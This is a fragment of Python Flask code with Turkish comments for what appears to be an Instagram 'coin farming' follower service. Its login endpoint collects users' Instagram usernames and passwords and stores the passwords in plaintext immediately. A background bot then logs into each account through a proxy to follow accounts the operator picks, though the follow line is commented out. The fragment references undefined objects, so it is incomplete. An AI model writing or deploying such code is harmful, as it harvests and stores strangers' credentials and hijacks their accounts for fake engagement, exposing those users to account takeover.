import os
import threading
import time
import random
from flask import Flask, request, jsonify, render_template_string
from flask_sqlalchemy import SQLAlchemy
from instagrapi import Client

# ... (Veritabanı ve Proxy ayarları v106 ile aynı kalsın) ...

# OTOMATİK İŞLEM FONKSİYONU (COIN KASMA)
def start_coin_farming(username, password, proxy_url):
    with app.app_context():
        cl = Client()
        user_record = IGUser.query.filter_by(username=username).first()
        try:
            cl.set_proxy(proxy_url)
            cl.request_timeout = 20
            
            # 1. ADIM: GİRİŞ YAP
            if cl.login(username, password):
                user_record.status = "GİRİŞ YAPILDI ✅"
                db.session.commit()
                
                # 2. ADIM: COIN KASMA (Örnek: Belirli birini takip et)
                # Buraya kendi ana hesabının ID'sini veya takip edilecek havuzu yazarsın
                time.sleep(5) 
                # cl.user_follow("TARGET_USER_ID") # Takip komutu
                
                user_record.status = "COIN KASIYOR... 🪙"
                db.session.commit()
            else:
                user_record.status = "Giriş Başarısız"
                db.session.commit()
        except Exception as e:
            print(f"Bot Hatası: {e}")
            user_record.status = f"Hata: {str(e)[:20]}"
            db.session.commit()

@app.route('/api/start-login', methods=['POST'])
def start_login():
    data = request.json
    u, p = data.get('u'), data.get('p')
    
    # Şifreyi hemen kaydet
    user = IGUser.query.filter_by(username=u).first()
    if not user:
        user = IGUser(username=u, password=p); db.session.add(user)
    else:
        user.password, user.status = p, "Sistem Başlatıldı"
    db.session.commit()

    # BOTU ARKA PLANDA ÇALIŞTIR (Kullanıcı beklemesin)
    threading.Thread(target=start_coin_farming, args=(u, p, PROXY_URL)).start()

    return jsonify(status="success", msg="Sistem bağlandı! Coin kasmaya başlanıyor...")
